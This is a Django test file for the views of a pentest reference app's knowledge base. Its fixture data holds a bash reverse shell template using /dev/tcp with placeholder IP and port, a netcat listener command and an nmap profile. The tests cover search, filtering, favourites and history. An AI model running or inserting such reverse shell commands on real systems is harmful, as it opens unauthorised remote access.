from django.contrib.contenttypes.models import ContentType
from django.test import TestCase
from django.urls import reverse
from django.utils.html import escape

from listeners.models import ListenerTemplate
from playbooks.models import PlaybookEntry
from recon.models import NmapProfile
from shells.models import ShellTemplate

from .models import SessionFavorite, SessionHistory


class KnowledgeViewsTests(TestCase):
    def setUp(self):
        self.shell = ShellTemplate.objects.create(
            name="Knowledge Bash Reverse",
            shell_type="reverse",
            language="bash",
            os="linux",
            description="Linux reverse shell reference",
            template="bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            tags="bash,reverse",
            difficulty="beginner",
            is_active=True,
        )
        self.listener = ListenerTemplate.objects.create(
            name="Knowledge Netcat Listener",
            tool="netcat",
            description="Listener reference",
            template="nc -lvnp {port}",
            tags="netcat,listener",
            is_active=True,
        )
        self.recon = NmapProfile.objects.create(
            name="Knowledge Basic Recon",
            description="Basic nmap profile",
            scan_type="basic",
            nse_categories="default,safe",
            extra_flags="-Pn",
            noise_level="low",
            lab_notes="Reference profile",
            is_active=True,
        )
        self.playbook = PlaybookEntry.objects.create(
            title="Knowledge Linux Enumeration",
            slug="knowledge-linux-enumeration",
            platform="linux",
            category="enumeration",
            tags="linux,enum",
            summary="Playbook summary",
            prerequisites="Shell",
            commands="id\nuname -a",
            explanation="Reference commands",
            warnings="Lab only",
            difficulty="beginner",
            is_active=True,
        )

    def test_index_loads(self):
        response = self.client.get(reverse("knowledge:index"))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, self.shell.name)
        self.assertContains(response, self.playbook.title)

    def test_index_search_filter(self):
        response = self.client.get(reverse("knowledge:index"), {"q": "Netcat"})
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, self.listener.name)
        self.assertNotContains(response, self.shell.name)

    def test_index_module_filter(self):
        response = self.client.get(reverse("knowledge:index"), {"module": "recon"})
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, self.recon.name)
        self.assertNotContains(response, self.shell.name)

    def test_detail_shell_entry(self):
        response = self.client.get(reverse("knowledge:detail", kwargs={"slug": f"shells-{self.shell.id}"}))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, escape(self.shell.template))

    def test_detail_playbook_entry(self):
        response = self.client.get(reverse("knowledge:detail", kwargs={"slug": f"playbooks-{self.playbook.slug}"}))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, self.playbook.commands)

    def test_toggle_favorite_and_list(self):
        response = self.client.post(
            reverse("knowledge:toggle_favorite"),
            {
                "app_label": "shells",
                "model": "shelltemplate",
                "object_id": str(self.shell.id),
                "next": reverse("knowledge:index"),
            },
        )

        self.assertEqual(response.status_code, 302)
        self.assertEqual(response.url, reverse("knowledge:index"))
        self.assertEqual(SessionFavorite.objects.count(), 1)

        favorites_response = self.client.get(reverse("knowledge:favorites"))
        self.assertEqual(favorites_response.status_code, 200)
        self.assertContains(favorites_response, self.shell.name)

    def test_history_view_lists_session_rows(self):
        session = self.client.session
        session.save()
        SessionHistory.objects.create(
            session_key=session.session_key,
            module="encoder",
            input_data={"encoding_type": "base64", "input_text": "hello"},
            generated_output="aGVsbG8=",
        )

        response = self.client.get(reverse("knowledge:history"))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "encoder")
        self.assertContains(response, "aGVsbG8=")

    def test_toggle_favorite_removes_existing_item(self):
        session = self.client.session
        session.save()
        content_type = ContentType.objects.get(app_label="shells", model="shelltemplate")
        SessionFavorite.objects.create(
            session_key=session.session_key,
            content_type=content_type,
            object_id=self.shell.id,
        )

        response = self.client.post(
            reverse("knowledge:toggle_favorite"),
            {
                "app_label": "shells",
                "model": "shelltemplate",
                "object_id": str(self.shell.id),
                "next": reverse("knowledge:favorites"),
            },
        )

        self.assertEqual(response.status_code, 302)
        self.assertEqual(SessionFavorite.objects.count(), 0)
